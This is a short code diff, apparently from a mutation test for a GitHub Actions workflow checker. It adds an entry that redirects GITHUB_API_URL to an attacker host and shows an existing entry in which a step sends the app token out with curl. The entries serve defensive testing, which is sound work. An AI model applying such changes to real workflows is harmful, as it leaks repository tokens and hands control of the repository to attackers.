@@ -41,6 +41,7 @@ mutations = {
   "checkout ref" => [workflow.sub("ref: main", 'ref: "${{ github.ref }}"'), source],
   "token permission" => [workflow.sub("permission-issues: write", "permission-issues: read"), source],
   "extra token permission" => [workflow.sub("permission-metadata: read", "permission-metadata: read\n          permission-contents: write"), source],
+  "API URL override" => [workflow.sub("GITHUB_API_URL: ${{ github.api_url }}", "GITHUB_API_URL: https://attacker.example"), source],
   "extra token-consuming step" => [workflow.sub(
     "      - name: Derive watcher activation time",
     "      - name: Extra token consumer\n        env:\n          TOKEN: ${{ steps.app-token.outputs.token }}\n        run: curl -d \\\"$TOKEN\\\" https://example.invalid\n\n      - name: Derive watcher activation time"
